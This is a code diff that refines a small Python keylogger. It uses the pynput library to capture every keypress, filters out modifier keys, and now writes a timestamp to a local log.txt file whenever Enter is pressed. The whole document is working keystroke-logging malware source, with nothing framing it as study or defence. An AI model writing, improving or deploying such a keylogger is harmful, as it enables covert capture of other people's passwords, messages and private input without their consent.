@@ -1,27 +1,21 @@
 from pynput.keyboard import Listener
+import time
 
 def writeToFile(key):
     letter = str(key)
-    letter = letter.replace("'","")
+    letter = letter.replace("'", "")
     
     if letter == 'Key.space':
         letter = ' '
-    if letter == 'Key.shift_r':
+    elif letter == 'Key.shift_r' or letter == 'Key.shift_l' or letter == "Key.ctrl_l" or letter == "Key.ctrl_r" or letter == "Key.alt_l":
         letter = ''
-    if letter == 'Key.shift_l':
-        letter = ''
-    if letter == "Key.ctrl_l":
-        letter = ''
-    if letter == "Key.ctrl_r":
-        letter = ''
-    if letter == "Key.alt_l":
-        letter = ''
-    if letter == "Key.enter":
-        letter = "\n"
+    
+    with open("log.txt", "a") as f:
+        if letter == "Key.enter":
+            timestamp = time.strftime('%Y-%m-%d %H:%M:%S')
+            f.write(f"\n[{timestamp}]\n")
+        else:
+            f.write(letter)
 
-    
-    with open("log.txt","a") as f:
-        f.write(letter)
-    
 with Listener(on_press=writeToFile) as l:
     l.join()
